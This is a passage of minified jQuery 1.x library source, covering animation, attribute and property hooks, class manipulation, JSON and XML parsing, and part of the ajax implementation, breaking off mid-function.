                        return this.options.duration ? this.pos = t = T.easing[this.easing](e, this.options.duration * e, 0, 1, this.options.duration) : this.pos = t = e, this.now = (this.end - this.start) * t + this.start, this.options.step && this.options.step.call(this.elem, this.now, this), i && i.set ? i.set(this) : at.propHooks._default.set(this), this
                    }
                }).init.prototype = at.prototype, (at.propHooks = {
                    _default: {
                        get: function(e) {
                            var t;
                            return 1 !== e.elem.nodeType || null != e.elem[e.prop] && null == e.elem.style[e.prop] ? e.elem[e.prop] : (t = T.css(e.elem, e.prop, "")) && "auto" !== t ? t : 0
                        },
                        set: function(e) {
                            T.fx.step[e.prop] ? T.fx.step[e.prop](e) : 1 !== e.elem.nodeType || null == e.elem.style[T.cssProps[e.prop]] && !T.cssHooks[e.prop] ? e.elem[e.prop] = e.now : T.style(e.elem, e.prop, e.now + e.unit)
                        }
                    }
                }).scrollTop = at.propHooks.scrollLeft = {
                    set: function(e) {
                        e.elem.nodeType && e.elem.parentNode && (e.elem[e.prop] = e.now)
                    }
                }, T.easing = {
                    linear: function(e) {
                        return e
                    },
                    swing: function(e) {
                        return .5 - Math.cos(e * Math.PI) / 2
                    },
                    _default: "swing"
                }, T.fx = at.prototype.init, T.fx.step = {};
                var lt, ct, ut, dt, ht, pt, ft, mt = /^(?:toggle|show|hide)$/,
                    gt = /queueHooks$/;

                function vt() {
                    return C.setTimeout(function() {
                        lt = void 0
                    }), lt = T.now()
                }

                function yt(e, t) {
                    var i, n = {
                            height: e
                        },
                        o = 0;
                    for (t = t ? 1 : 0; o < 4; o += 2 - t) n["margin" + (i = X[o])] = n["padding" + i] = e;
                    return t && (n.opacity = n.width = e), n
                }

                function bt(e, t, i) {
                    for (var n, o = (wt.tweeners[t] || []).concat(wt.tweeners["*"]), s = 0, r = o.length; s < r; s++)
                        if (n = o[s].call(i, t, e)) return n
                }

                function wt(s, e, t) {
                    var i, r, n = 0,
                        o = wt.prefilters.length,
                        a = T.Deferred().always(function() {
                            delete l.elem
                        }),
                        l = function() {
                            if (r) return !1;
                            for (var e = lt || vt(), t = Math.max(0, c.startTime + c.duration - e), i = 1 - (t / c.duration || 0), n = 0, o = c.tweens.length; n < o; n++) c.tweens[n].run(i);
                            return a.notifyWith(s, [c, i, t]), i < 1 && o ? t : (a.resolveWith(s, [c]), !1)
                        },
                        c = a.promise({
                            elem: s,
                            props: T.extend({}, e),
                            opts: T.extend(!0, {
                                specialEasing: {},
                                easing: T.easing._default
                            }, t),
                            originalProperties: e,
                            originalOptions: t,
                            startTime: lt || vt(),
                            duration: t.duration,
                            tweens: [],
                            createTween: function(e, t) {
                                var i = T.Tween(s, c.opts, e, t, c.opts.specialEasing[e] || c.opts.easing);
                                return c.tweens.push(i), i
                            },
                            stop: function(e) {
                                var t = 0,
                                    i = e ? c.tweens.length : 0;
                                if (r) return this;
                                for (r = !0; t < i; t++) c.tweens[t].run(1);
                                return e ? (a.notifyWith(s, [c, 1, 0]), a.resolveWith(s, [c, e])) : a.rejectWith(s, [c, e]), this
                            }
                        }),
                        u = c.props;
                    for (function(e, t) {
                        var i, n, o, s, r;
                        for (i in e)
                            if (o = t[n = T.camelCase(i)], s = e[i], T.isArray(s) && (o = s[1], s = e[i] = s[0]), i !== n && (e[n] = s, delete e[i]), (r = T.cssHooks[n]) && "expand" in r)
                                for (i in s = r.expand(s), delete e[n], s) i in e || (e[i] = s[i], t[i] = o);
                            else t[n] = o
                    }(u, c.opts.specialEasing); n < o; n++)
                        if (i = wt.prefilters[n].call(c, s, u, c.opts)) return T.isFunction(i.stop) && (T._queueHooks(c.elem, c.opts.queue).stop = T.proxy(i.stop, i)), i;
                    return T.map(u, bt, c), T.isFunction(c.opts.start) && c.opts.start.call(s, c), T.fx.timer(T.extend(l, {
                        elem: s,
                        anim: c,
                        queue: c.opts.queue
                    })), c.progress(c.opts.progress).done(c.opts.done, c.opts.complete).fail(c.opts.fail).always(c.opts.always)
                }
                T.Animation = T.extend(wt, {
                    tweeners: {
                        "*": [
                            function(e, t) {
                                var i = this.createTween(e, t);
                                return U(i.elem, e, V.exec(t), i), i
                            }
                        ]
                    },
                    tweener: function(e, t) {
                        for (var i, n = 0, o = (e = T.isFunction(e) ? (t = e, ["*"]) : e.match(L)).length; n < o; n++) i = e[n], wt.tweeners[i] = wt.tweeners[i] || [], wt.tweeners[i].unshift(t)
                    },
                    prefilters: [
                        function(t, e, i) {
                            var n, o, s, r, a, l, c, u = this,
                                d = {},
                                h = t.style,
                                p = t.nodeType && G(t),
                                f = T._data(t, "fxshow");
                            for (n in i.queue || (null == (a = T._queueHooks(t, "fx")).unqueued && (a.unqueued = 0, l = a.empty.fire, a.empty.fire = function() {
                                a.unqueued || l()
                            }), a.unqueued++, u.always(function() {
                                u.always(function() {
                                    a.unqueued--, T.queue(t, "fx").length || a.empty.fire()
                                })
                            })), 1 === t.nodeType && ("height" in e || "width" in e) && (i.overflow = [h.overflow, h.overflowX, h.overflowY], "inline" === ("none" === (c = T.css(t, "display")) ? T._data(t, "olddisplay") || Fe(t.nodeName) : c) && "none" === T.css(t, "float") && (v.inlineBlockNeedsLayout && "inline" !== Fe(t.nodeName) ? h.zoom = 1 : h.display = "inline-block")), i.overflow && (h.overflow = "hidden", v.shrinkWrapBlocks() || u.always(function() {
                                h.overflow = i.overflow[0], h.overflowX = i.overflow[1], h.overflowY = i.overflow[2]
                            })), e)
                                if (o = e[n], mt.exec(o)) {
                                    if (delete e[n], s = s || "toggle" === o, o === (p ? "hide" : "show")) {
                                        if ("show" !== o || !f || void 0 === f[n]) continue;
                                        p = !0
                                    }
                                    d[n] = f && f[n] || T.style(t, n)
                                } else c = void 0;
                            if (T.isEmptyObject(d)) "inline" === ("none" === c ? Fe(t.nodeName) : c) && (h.display = c);
                            else
                                for (n in f ? "hidden" in f && (p = f.hidden) : f = T._data(t, "fxshow", {}), s && (f.hidden = !p), p ? T(t).show() : u.done(function() {
                                    T(t).hide()
                                }), u.done(function() {
                                    var e;
                                    for (e in T._removeData(t, "fxshow"), d) T.style(t, e, d[e])
                                }), d) r = bt(p ? f[n] : 0, n, u), n in f || (f[n] = r.start, p && (r.end = r.start, r.start = "width" === n || "height" === n ? 1 : 0))
                        }
                    ],
                    prefilter: function(e, t) {
                        t ? wt.prefilters.unshift(e) : wt.prefilters.push(e)
                    }
                }), T.speed = function(e, t, i) {
                    var n = e && "object" == typeof e ? T.extend({}, e) : {
                        complete: i || !i && t || T.isFunction(e) && e,
                        duration: e,
                        easing: i && t || t && !T.isFunction(t) && t
                    };
                    return n.duration = T.fx.off ? 0 : "number" == typeof n.duration ? n.duration : n.duration in T.fx.speeds ? T.fx.speeds[n.duration] : T.fx.speeds._default, null != n.queue && !0 !== n.queue || (n.queue = "fx"), n.old = n.complete, n.complete = function() {
                        T.isFunction(n.old) && n.old.call(this), n.queue && T.dequeue(this, n.queue)
                    }, n
                }, T.fn.extend({
                    fadeTo: function(e, t, i, n) {
                        return this.filter(G).css("opacity", 0).show().end().animate({
                            opacity: t
                        }, e, i, n)
                    },
                    animate: function(t, e, i, n) {
                        var o = T.isEmptyObject(t),
                            s = T.speed(e, i, n),
                            r = function() {
                                var e = wt(this, T.extend({}, t), s);
                                (o || T._data(this, "finish")) && e.stop(!0)
                            };
                        return r.finish = r, o || !1 === s.queue ? this.each(r) : this.queue(s.queue, r)
                    },
                    stop: function(o, e, s) {
                        var r = function(e) {
                            var t = e.stop;
                            delete e.stop, t(s)
                        };
                        return "string" != typeof o && (s = e, e = o, o = void 0), e && !1 !== o && this.queue(o || "fx", []), this.each(function() {
                            var e = !0,
                                t = null != o && o + "queueHooks",
                                i = T.timers,
                                n = T._data(this);
                            if (t) n[t] && n[t].stop && r(n[t]);
                            else
                                for (t in n) n[t] && n[t].stop && gt.test(t) && r(n[t]);
                            for (t = i.length; t--;) i[t].elem !== this || null != o && i[t].queue !== o || (i[t].anim.stop(s), e = !1, i.splice(t, 1));
                            !e && s || T.dequeue(this, o)
                        })
                    },
                    finish: function(r) {
                        return !1 !== r && (r = r || "fx"), this.each(function() {
                            var e, t = T._data(this),
                                i = t[r + "queue"],
                                n = t[r + "queueHooks"],
                                o = T.timers,
                                s = i ? i.length : 0;
                            for (t.finish = !0, T.queue(this, r, []), n && n.stop && n.stop.call(this, !0), e = o.length; e--;) o[e].elem === this && o[e].queue === r && (o[e].anim.stop(!0), o.splice(e, 1));
                            for (e = 0; e < s; e++) i[e] && i[e].finish && i[e].finish.call(this);
                            delete t.finish
                        })
                    }
                }), T.each(["toggle", "show", "hide"], function(e, n) {
                    var o = T.fn[n];
                    T.fn[n] = function(e, t, i) {
                        return null == e || "boolean" == typeof e ? o.apply(this, arguments) : this.animate(yt(n, !0), e, t, i)
                    }
                }), T.each({
                    slideDown: yt("show"),
                    slideUp: yt("hide"),
                    slideToggle: yt("toggle"),
                    fadeIn: {
                        opacity: "show"
                    },
                    fadeOut: {
                        opacity: "hide"
                    },
                    fadeToggle: {
                        opacity: "toggle"
                    }
                }, function(e, n) {
                    T.fn[e] = function(e, t, i) {
                        return this.animate(n, e, t, i)
                    }
                }), T.timers = [], T.fx.tick = function() {
                    var e, t = T.timers,
                        i = 0;
                    for (lt = T.now(); i < t.length; i++)(e = t[i])() || t[i] !== e || t.splice(i--, 1);
                    t.length || T.fx.stop(), lt = void 0
                }, T.fx.timer = function(e) {
                    T.timers.push(e), e() ? T.fx.start() : T.timers.pop()
                }, T.fx.interval = 13, T.fx.start = function() {
                    ct || (ct = C.setInterval(T.fx.tick, T.fx.interval))
                }, T.fx.stop = function() {
                    C.clearInterval(ct), ct = null
                }, T.fx.speeds = {
                    slow: 600,
                    fast: 200,
                    _default: 400
                }, T.fn.delay = function(n, e) {
                    return n = T.fx && T.fx.speeds[n] || n, e = e || "fx", this.queue(e, function(e, t) {
                        var i = C.setTimeout(e, n);
                        t.stop = function() {
                            C.clearTimeout(i)
                        }
                    })
                }, dt = f.createElement("input"), ht = f.createElement("div"), pt = f.createElement("select"), ft = pt.appendChild(f.createElement("option")), (ht = f.createElement("div")).setAttribute("className", "t"), ht.innerHTML = "  <link/><table></table><a href='/a'>a</a><input type='checkbox'/>", ut = ht.getElementsByTagName("a")[0], dt.setAttribute("type", "checkbox"), ht.appendChild(dt), (ut = ht.getElementsByTagName("a")[0]).style.cssText = "top:1px", v.getSetAttribute = "t" !== ht.className, v.style = /top/.test(ut.getAttribute("style")), v.hrefNormalized = "/a" === ut.getAttribute("href"), v.checkOn = !!dt.value, v.optSelected = ft.selected, v.enctype = !!f.createElement("form").enctype, pt.disabled = !0, v.optDisabled = !ft.disabled, (dt = f.createElement("input")).setAttribute("value", ""), v.input = "" === dt.getAttribute("value"), dt.value = "t", dt.setAttribute("type", "radio"), v.radioValue = "t" === dt.value;
                var xt = /\r/g,
                    _t = /[\x20\t\r\n\f]+/g;
                T.fn.extend({
                    val: function(i) {
                        var n, e, o, t = this[0];
                        return arguments.length ? (o = T.isFunction(i), this.each(function(e) {
                            var t;
                            1 === this.nodeType && (null == (t = o ? i.call(this, e, T(this).val()) : i) ? t = "" : "number" == typeof t ? t += "" : T.isArray(t) && (t = T.map(t, function(e) {
                                return null == e ? "" : e + ""
                            })), (n = T.valHooks[this.type] || T.valHooks[this.nodeName.toLowerCase()]) && "set" in n && void 0 !== n.set(this, t, "value") || (this.value = t))
                        })) : t ? (n = T.valHooks[t.type] || T.valHooks[t.nodeName.toLowerCase()]) && "get" in n && void 0 !== (e = n.get(t, "value")) ? e : "string" == typeof(e = t.value) ? e.replace(xt, "") : null == e ? "" : e : void 0
                    }
                }), T.extend({
                    valHooks: {
                        option: {
                            get: function(e) {
                                var t = T.find.attr(e, "value");
                                return null != t ? t : T.trim(T.text(e)).replace(_t, " ")
                            }
                        },
                        select: {
                            get: function(e) {
                                for (var t, i, n = e.options, o = e.selectedIndex, s = "select-one" === e.type || o < 0, r = s ? null : [], a = s ? o + 1 : n.length, l = o < 0 ? a : s ? o : 0; l < a; l++)
                                    if (((i = n[l]).selected || l === o) && (v.optDisabled ? !i.disabled : null === i.getAttribute("disabled")) && (!i.parentNode.disabled || !T.nodeName(i.parentNode, "optgroup"))) {
                                        if (t = T(i).val(), s) return t;
                                        r.push(t)
                                    }
                                return r
                            },
                            set: function(e, t) {
                                for (var i, n, o = e.options, s = T.makeArray(t), r = o.length; r--;)
                                    if (n = o[r], -1 < T.inArray(T.valHooks.option.get(n), s)) try {
                                        n.selected = i = !0
                                    } catch (e) {
                                        n.scrollHeight
                                    } else n.selected = !1;
                                return i || (e.selectedIndex = -1), o
                            }
                        }
                    }
                }), T.each(["radio", "checkbox"], function() {
                    T.valHooks[this] = {
                        set: function(e, t) {
                            return T.isArray(t) ? e.checked = -1 < T.inArray(T(e).val(), t) : void 0
                        }
                    }, v.checkOn || (T.valHooks[this].get = function(e) {
                        return null === e.getAttribute("value") ? "on" : e.value
                    })
                });
                var Ct, Tt, kt = T.expr.attrHandle,
                    $t = /^(?:checked|selected)$/i,
                    Et = v.getSetAttribute,
                    St = v.input;
                T.fn.extend({
                    attr: function(e, t) {
                        return Z(this, T.attr, e, t, 1 < arguments.length)
                    },
                    removeAttr: function(e) {
                        return this.each(function() {
                            T.removeAttr(this, e)
                        })
                    }
                }), T.extend({
                    attr: function(e, t, i) {
                        var n, o, s = e.nodeType;
                        if (3 !== s && 8 !== s && 2 !== s) return void 0 === e.getAttribute ? T.prop(e, t, i) : (1 === s && T.isXMLDoc(e) || (t = t.toLowerCase(), o = T.attrHooks[t] || (T.expr.match.bool.test(t) ? Tt : Ct)), void 0 !== i ? null === i ? void T.removeAttr(e, t) : o && "set" in o && void 0 !== (n = o.set(e, i, t)) ? n : (e.setAttribute(t, i + ""), i) : o && "get" in o && null !== (n = o.get(e, t)) ? n : null == (n = T.find.attr(e, t)) ? void 0 : n)
                    },
                    attrHooks: {
                        type: {
                            set: function(e, t) {
                                if (!v.radioValue && "radio" === t && T.nodeName(e, "input")) {
                                    var i = e.value;
                                    return e.setAttribute("type", t), i && (e.value = i), t
                                }
                            }
                        }
                    },
                    removeAttr: function(e, t) {
                        var i, n, o = 0,
                            s = t && t.match(L);
                        if (s && 1 === e.nodeType)
                            for (; i = s[o++];) n = T.propFix[i] || i, T.expr.match.bool.test(i) ? St && Et || !$t.test(i) ? e[n] = !1 : e[T.camelCase("default-" + i)] = e[n] = !1 : T.attr(e, i, ""), e.removeAttribute(Et ? i : n)
                    }
                }), Tt = {
                    set: function(e, t, i) {
                        return !1 === t ? T.removeAttr(e, i) : St && Et || !$t.test(i) ? e.setAttribute(!Et && T.propFix[i] || i, i) : e[T.camelCase("default-" + i)] = e[i] = !0, i
                    }
                }, T.each(T.expr.match.bool.source.match(/\w+/g), function(e, t) {
                    var s = kt[t] || T.find.attr;
                    St && Et || !$t.test(t) ? kt[t] = function(e, t, i) {
                        var n, o;
                        return i || (o = kt[t], kt[t] = n, n = null != s(e, t, i) ? t.toLowerCase() : null, kt[t] = o), n
                    } : kt[t] = function(e, t, i) {
                        return i ? void 0 : e[T.camelCase("default-" + t)] ? t.toLowerCase() : null
                    }
                }), St && Et || (T.attrHooks.value = {
                    set: function(e, t, i) {
                        return T.nodeName(e, "input") ? void(e.defaultValue = t) : Ct && Ct.set(e, t, i)
                    }
                }), Et || (Ct = {
                    set: function(e, t, i) {
                        var n = e.getAttributeNode(i);
                        return n || e.setAttributeNode(n = e.ownerDocument.createAttribute(i)), n.value = t += "", "value" === i || t === e.getAttribute(i) ? t : void 0
                    }
                }, kt.id = kt.name = kt.coords = function(e, t, i) {
                    var n;
                    return i ? void 0 : (n = e.getAttributeNode(t)) && "" !== n.value ? n.value : null
                }, T.valHooks.button = {
                    get: function(e, t) {
                        var i = e.getAttributeNode(t);
                        return i && i.specified ? i.value : void 0
                    },
                    set: Ct.set
                }, T.attrHooks.contenteditable = {
                    set: function(e, t, i) {
                        Ct.set(e, "" !== t && t, i)
                    }
                }, T.each(["width", "height"], function(e, i) {
                    T.attrHooks[i] = {
                        set: function(e, t) {
                            return "" === t ? (e.setAttribute(i, "auto"), t) : void 0
                        }
                    }
                })), v.style || (T.attrHooks.style = {
                    get: function(e) {
                        return e.style.cssText || void 0
                    },
                    set: function(e, t) {
                        return e.style.cssText = t + ""
                    }
                });
                var At = /^(?:input|select|textarea|button|object)$/i,
                    Dt = /^(?:a|area)$/i;
                T.fn.extend({
                    prop: function(e, t) {
                        return Z(this, T.prop, e, t, 1 < arguments.length)
                    },
                    removeProp: function(e) {
                        return e = T.propFix[e] || e, this.each(function() {
                            try {
                                this[e] = void 0, delete this[e]
                            } catch (e) {}
                        })
                    }
                }), T.extend({
                    prop: function(e, t, i) {
                        var n, o, s = e.nodeType;
                        if (3 !== s && 8 !== s && 2 !== s) return 1 === s && T.isXMLDoc(e) || (t = T.propFix[t] || t, o = T.propHooks[t]), void 0 !== i ? o && "set" in o && void 0 !== (n = o.set(e, i, t)) ? n : e[t] = i : o && "get" in o && null !== (n = o.get(e, t)) ? n : e[t]
                    },
                    propHooks: {
                        tabIndex: {
                            get: function(e) {
                                var t = T.find.attr(e, "tabindex");
                                return t ? parseInt(t, 10) : At.test(e.nodeName) || Dt.test(e.nodeName) && e.href ? 0 : -1
                            }
                        }
                    },
                    propFix: {
                        for: "htmlFor",
                        class: "className"
                    }
                }), v.hrefNormalized || T.each(["href", "src"], function(e, t) {
                    T.propHooks[t] = {
                        get: function(e) {
                            return e.getAttribute(t, 4)
                        }
                    }
                }), v.optSelected || (T.propHooks.selected = {
                    get: function(e) {
                        var t = e.parentNode;
                        return t && (t.selectedIndex, t.parentNode && t.parentNode.selectedIndex), null
                    },
                    set: function(e) {
                        var t = e.parentNode;
                        t && (t.selectedIndex, t.parentNode && t.parentNode.selectedIndex)
                    }
                }), T.each(["tabIndex", "readOnly", "maxLength", "cellSpacing", "cellPadding", "rowSpan", "colSpan", "useMap", "frameBorder", "contentEditable"], function() {
                    T.propFix[this.toLowerCase()] = this
                }), v.enctype || (T.propFix.enctype = "encoding");
                var jt = /[\t\r\n\f]/g;

                function Nt(e) {
                    return T.attr(e, "class") || ""
                }
                T.fn.extend({
                    addClass: function(t) {
                        var e, i, n, o, s, r, a, l = 0;
                        if (T.isFunction(t)) return this.each(function(e) {
                            T(this).addClass(t.call(this, e, Nt(this)))
                        });
                        if ("string" == typeof t && t)
                            for (e = t.match(L) || []; i = this[l++];)
                                if (o = Nt(i), n = 1 === i.nodeType && (" " + o + " ").replace(jt, " ")) {
                                    for (r = 0; s = e[r++];) n.indexOf(" " + s + " ") < 0 && (n += s + " ");
                                    o !== (a = T.trim(n)) && T.attr(i, "class", a)
                                }
                        return this
                    },
                    removeClass: function(t) {
                        var e, i, n, o, s, r, a, l = 0;
                        if (T.isFunction(t)) return this.each(function(e) {
                            T(this).removeClass(t.call(this, e, Nt(this)))
                        });
                        if (!arguments.length) return this.attr("class", "");
                        if ("string" == typeof t && t)
                            for (e = t.match(L) || []; i = this[l++];)
                                if (o = Nt(i), n = 1 === i.nodeType && (" " + o + " ").replace(jt, " ")) {
                                    for (r = 0; s = e[r++];)
                                        for (; - 1 < n.indexOf(" " + s + " ");) n = n.replace(" " + s + " ", " ");
                                    o !== (a = T.trim(n)) && T.attr(i, "class", a)
                                }
                        return this
                    },
                    toggleClass: function(o, t) {
                        var s = typeof o;
                        return "boolean" == typeof t && "string" == s ? t ? this.addClass(o) : this.removeClass(o) : T.isFunction(o) ? this.each(function(e) {
                            T(this).toggleClass(o.call(this, e, Nt(this), t), t)
                        }) : this.each(function() {
                            var e, t, i, n;
                            if ("string" == s)
                                for (t = 0, i = T(this), n = o.match(L) || []; e = n[t++];) i.hasClass(e) ? i.removeClass(e) : i.addClass(e);
                            else void 0 !== o && "boolean" != s || ((e = Nt(this)) && T._data(this, "__className__", e), T.attr(this, "class", e || !1 === o ? "" : T._data(this, "__className__") || ""))
                        })
                    },
                    hasClass: function(e) {
                        var t, i, n = 0;
                        for (t = " " + e + " "; i = this[n++];)
                            if (1 === i.nodeType && -1 < (" " + Nt(i) + " ").replace(jt, " ").indexOf(t)) return !0;
                        return !1
                    }
                }), T.each("blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error contextmenu".split(" "), function(e, i) {
                    T.fn[i] = function(e, t) {
                        return 0 < arguments.length ? this.on(i, null, e, t) : this.trigger(i)
                    }
                }), T.fn.extend({
                    hover: function(e, t) {
                        return this.mouseenter(e).mouseleave(t || e)
                    }
                });
                var Lt = C.location,
                    zt = T.now(),
                    Mt = /\?/,
                    qt = /(,)|(\[|{)|(}|])|"(?:[^"\\\r\n]|\\["\\\/bfnrt]|\\u[\da-fA-F]{4})*"\s*:?|true|false|null|-?(?!0\d)\d+(?:\.\d+|)(?:[eE][+-]?\d+|)/g;
                T.parseJSON = function(e) {
                    if (C.JSON && C.JSON.parse) return C.JSON.parse(e + "");
                    var o, s = null,
                        t = T.trim(e + "");
                    return t && !T.trim(t.replace(qt, function(e, t, i, n) {
                        return o && t && (s = 0), 0 === s ? e : (o = i || t, s += !n - !i, "")
                    })) ? Function("return " + t)() : T.error("Invalid JSON: " + e)
                }, T.parseXML = function(e) {
                    var t;
                    if (!e || "string" != typeof e) return null;
                    try {
                        C.DOMParser ? t = (new C.DOMParser).parseFromString(e, "text/xml") : ((t = new C.ActiveXObject("Microsoft.XMLDOM")).async = "false", t.loadXML(e))
                    } catch (e) {
                        t = void 0
                    }
                    return t && t.documentElement && !t.getElementsByTagName("parsererror").length || T.error("Invalid XML: " + e), t
                };
                var Pt = /#.*$/,
                    Ot = /([?&])_=[^&]*/,
                    Ft = /^(.*?):[ \t]*([^\r\n]*)\r?$/gm,
                    Ht = /^(?:GET|HEAD)$/,
                    Bt = /^\/\//,
                    It = /^([\w.+-]+:)(?:\/\/(?:[^\/?#]*@|)([^\/?#:]*)(?::(\d+)|)|)/,
                    Rt = {},
                    Wt = {},
                    Vt = "*/".concat("*"),
                    Xt = Lt.href,
                    Gt = It.exec(Xt.toLowerCase()) || [];

                function Ut(s) {
                    return function(e, t) {
                        "string" != typeof e && (t = e, e = "*");
                        var i, n = 0,
                            o = e.toLowerCase().match(L) || [];
                        if (T.isFunction(t))
                            for (; i = o[n++];) "+" === i.charAt(0) ? (i = i.slice(1) || "*", (s[i] = s[i] || []).unshift(t)) : (s[i] = s[i] || []).push(t)
                    }
                }

                function Qt(t, o, s, r) {
                    var a = {},
                        l = t === Wt;

                    function c(e) {
                        var n;
                        return a[e] = !0, T.each(t[e] || [], function(e, t) {
                            var i = t(o, s, r);
                            return "string" != typeof i || l || a[i] ? l ? !(n = i) : void 0 : (o.dataTypes.unshift(i), c(i), !1)
                        }), n
                    }
                    return c(o.dataTypes[0]) || !a["*"] && c("*")
                }

                function Yt(e, t) {
                    var i, n, o = T.ajaxSettings.flatOptions || {};
                    for (n in t) void 0 !== t[n] && ((o[n] ? e : i || (i = {}))[n] = t[n]);
                    return i && T.extend(!0, e, i), e
                }
                T.extend({
                    active: 0,
                    lastModified: {},
                    etag: {},
                    ajaxSettings: {
                        url: Xt,
                        type: "GET",
                        isLocal: /^(?:about|app|app-storage|.+-extension|file|res|widget):$/.test(Gt[1]),
                        global: !0,
                        processData: !0,
                        async: !0,
                        contentType: "application/x-www-form-urlencoded; charset=UTF-8",
                        accepts: {
                            "*": Vt,
                            text: "text/plain",
                            html: "text/html",
                            xml: "application/xml, text/xml",
                            json: "application/json, text/javascript"
                        },
                        contents: {
                            xml: /\bxml\b/,
                            html: /\bhtml/,
                            json: /\bjson\b/
                        },
                        responseFields: {
                            xml: "responseXML",
                            text: "responseText",
                            json: "responseJSON"
                        },
                        converters: {
                            "* text": String,
                            "text html": !0,
                            "text json": T.parseJSON,
                            "text xml": T.parseXML
                        },
                        flatOptions: {
                            url: !0,
                            context: !0
                        }
                    },
                    ajaxSetup: function(e, t) {
                        return t ? Yt(Yt(e, T.ajaxSettings), t) : Yt(T.ajaxSettings, e)
                    },
                    ajaxPrefilter: Ut(Rt),
                    ajaxTransport: Ut(Wt),
                    ajax: function(e, t) {
                        "object" == typeof e && (t = e, e = void 0), t = t || {};
                        var i, n, u, d, h, p, f, o, m = T.ajaxSetup({}, t),
                            g = m.context || m,
                            v = m.context && (g.nodeType || g.jquery) ? T(g) : T.event,
                            y = T.Deferred(),
                            b = T.Callbacks("once memory"),
                            w = m.statusCode || {},
                            s = {},
                            r = {},
                            x = 0,
                            a = "canceled",
                            _ = {
                                readyState: 0,
                                getResponseHeader: function(e) {
                                    var t;
                                    if (2 === x) {
                                        if (!o)
                                            for (o = {}; t = Ft.exec(d);) o[t[1].toLowerCase()] = t[2];
                                        t = o[e.toLowerCase()]
                                    }
                                    return null == t ? null : t
                                },
                                getAllResponseHeaders: function() {
                                    return 2 === x ? d : null
                                },
                                setRequestHeader: function(e, t) {
                                    var i = e.toLowerCase();
                                    return x || (e = r[i] = r[i] || e, s[e] = t), this
                                },
                                overrideMimeType: function(e) {
                                    return x || (m.mimeType = e), this
                                },
                                statusCode: function(e) {
                                    var t;
                                    if (e)
                                        if (x < 2)
                                            for (t in e) w[t] = [w[t], e[t]];
                                        else _.always(e[_.status]);
                                    return this
                                },
                                abort: function(e) {
                                    var t = e || a;
                                    return f && f.abort(t), l(0, t), this
                                }
                            };
                        if (y.promise(_).complete = b.add, _.success = _.done, _.error = _.fail, m.url = ((e || m.url || Xt) + "").replace(Pt, "").replace(Bt, Gt[1] + "//"), m.type = t.method || t.type || m.method || m.type, m.dataTypes = T.trim(m.dataType || "*").toLowerCase().match(L) || [""], null == m.crossDomain && (i = It.exec(m.url.toLowerCase()), m.crossDomain = !(!i || i[1] === Gt[1] && i[2] === Gt[2] && (i[3] || ("http:" === i[1] ? "80" : "443")) === (Gt[3] || ("http:" === Gt[1] ? "80" : "443")))), m.data && m.processData && "string" != typeof m.data && (m.data = T.param(m.data, m.traditional)), Qt(Rt, m, t, _), 2 === x) return _;
                        for (n in (p = T.event && m.global) && 0 == T.active++ && T.event.trigger("ajaxStart"), m.type = m.type.toUpperCase(), m.hasContent = !Ht.test(m.type), u = m.url, m.hasContent || (m.data && (u = m.url += (Mt.test(u) ? "&" : "?") + m.data, delete m.data), !1 === m.cache && (m.url = Ot.test(u) ? u.replace(Ot, "$1_=" + zt++) : u + (Mt.test(u) ? "&" : "?") + "_=" + zt++)), m.ifModified && (T.lastModified[u] && _.setRequestHeader("If-Modified-Since", T.lastModified[u]), T.etag[u] && _.setRequestHeader("If-None-Match", T.etag[u])), (m.data && m.hasContent && !1 !== m.contentType || t.contentType) && _.setRequestHeader("Content-Type", m.contentType), _.setRequestHeader("Accept", m.dataTypes[0] && m.accepts[m.dataTypes[0]] ? m.accepts[m.dataTypes[0]] + ("*" !== m.dataTypes[0] ? ", " + Vt + "; q=0.01" : "") : m.accepts["*"]), m.headers) _.setRequestHeader(n, m.headers[n]);
                        if (m.beforeSend && (!1 === m.beforeSend.call(g, _, m) || 2 === x)) return _.abort();
                        for (n in a = "abort", {
                            success: 1,
                            error: 1,
                            complete: 1
                        }) _[n](m[n]);
                        if (f = Qt(Wt, m, t, _)) {
                            if (_.readyState = 1, p && v.trigger("ajaxSend", [_, m]), 2 === x) return _;
                            m.async && 0 < m.timeout && (h = C.setTimeout(function() {
                                _.abort("timeout")
                            }, m.timeout));
                            try {
                                x = 1, f.send(s, l)
                            } catch (e) {
                                if (!(x < 2)) throw e;
                                l(-1, e)
                            }
                        } else l(-1, "No Transport");

                        function l(e, t, i, n) {
                            var o, s, r, a, l, c = t;
                            2 !== x && (x = 2, h && C.clearTimeout(h), f = void 0, d = n || "", _.readyState = 0 < e ? 4 : 0, o = 200 <= e && e < 300 || 304 === e, i && (a = function(e, t, i) {
                                for (var n, o, s, r, a = e.contents, l = e.dataTypes;
                                    "*" === l[0];) l.shift(), void 0 === o && (o = e.mimeType || t.getResponseHeader("Content-Type"));
                                if (o)
                                    for (r in a)
                                        if (a[r] && a[r].test(o)) {
                                            l.unshift(r);
                                            break
                                        }
                                if (l[0] in i) s = l[0];
                                else {
                                    for (r in i) {
                                        if (!l[0] || e.converters[r + " " + l[0]]) {
                                            s = r;
                                            break
                                        }
                                        n || (n = r)
                                    }
                                    s = s || n
                                }
                                return s ? (s !== l[0] && l.unshift(s), i[s]) : void 0
                            }(m, _, i)), a = function(e, t, i, n) {
                                var o, s, r, a, l, c = {},
                                    u = e.dataTypes.slice();
                                if (u[1])
                                    for (r in e.converters) c[r.toLowerCase()] = e.converters[r];
                                for (s = u.shift(); s;)
                                    if (e.responseFields[s] && (i[e.responseFields[s]] = t), !l && n && e.dataFilter && (t = e.dataFilter(t, e.dataType)), l = s, s = u.shift())
                                        if ("*" === s) s = l;
                                        else if ("*" !== l && l !== s) {
                                    if (!(r = c[l + " " + s] || c["* " + s]))
                                        for (o in c)
                                            if ((a = o.split(" "))[1] === s && (r = c[l + " " + a[0]] || c["* " + a[0]])) {
                                                !0 === r ? r = c[o] : !0 !== c[o] && (s = a[0], u.unshift(a[1]));
                                                break
                                            }
                                    if (!0 !== r)
                                        if (r && e.throws) t = r(t);
                                        else try {
                                            t = r(t)
                                        } catch (e) {
                                            return {
                                                state: "parsererror",
                                                error: r ? e : "No conversion from " + l + " to " + s
                                            }
                                        }
                                }
                                return {
                                    state: "success",
                                    data: t
                                }
